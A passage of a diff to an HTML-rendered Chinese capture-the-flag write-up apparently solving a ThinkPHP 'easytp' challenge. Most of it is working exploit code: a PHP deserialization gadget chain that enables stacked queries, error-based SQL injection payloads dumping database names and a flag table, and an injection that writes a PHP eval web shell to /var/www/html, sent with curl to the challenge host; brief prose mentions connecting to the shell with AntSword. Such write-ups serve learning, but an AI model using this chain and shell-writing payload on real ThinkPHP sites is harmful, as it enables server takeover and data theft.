-&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
-&lt;span style="color:#111">),&lt;/span>
-&lt;span style="color:#111">));&lt;/span>
-&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中curl的代码是用postman生成的 &lt;del>（postman打钱）&lt;/del> 一套连招直接带走，用蚁剑连接之后发现根目录下没有flag，反而是一个flag.sh&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们还可以把堆叠打开，用堆叠注入写shell，也就是本题的exp（参考&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">赵总的exp&lt;/a> 赵总牛逼&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// 开启才能读取文件
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_MULTI_STATEMENTS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// 打开堆叠注入
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;3306&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// 猜出弱口令
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75715e">// 堆叠注入写入shell
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=1;select &amp;#39;&amp;lt;?php eval(&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">_POST[amiz]);?&amp;gt;&amp;#39; into outfile &amp;#39;/var/www/html/amiz.php&amp;#39;;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中curl的代码是用postman生成的 &lt;del>（postman打钱）&lt;/del> 一套连招直接带走，用蚁剑连接之后发现根目录下没有flag，反而是一个flag.sh&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219194548981.png" alt="image-20211219194548981">&lt;/p>
 &lt;p>我们还得连上数据库看看&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195443288.png" alt="image-20211219195443288">&lt;/p>
